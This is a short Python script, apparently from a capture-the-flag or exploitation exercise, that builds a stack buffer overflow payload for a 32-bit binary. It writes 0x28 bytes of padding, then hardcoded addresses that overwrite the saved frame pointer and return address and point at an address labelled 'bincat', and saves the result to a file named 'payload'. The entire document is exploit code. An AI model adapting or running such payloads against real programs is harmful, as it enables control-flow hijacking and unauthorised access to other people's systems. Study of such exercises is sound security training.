import struct

padding = b'A'*0x28
ebp = struct.pack('I', 0x0804860b)
bincat = struct.pack('I', 0x804a030)
eip = struct.pack('I', 0x0804861a)

final = padding + ebp + eip + bincat

with open ('payload', 'wb') as f:
    f.write(final)
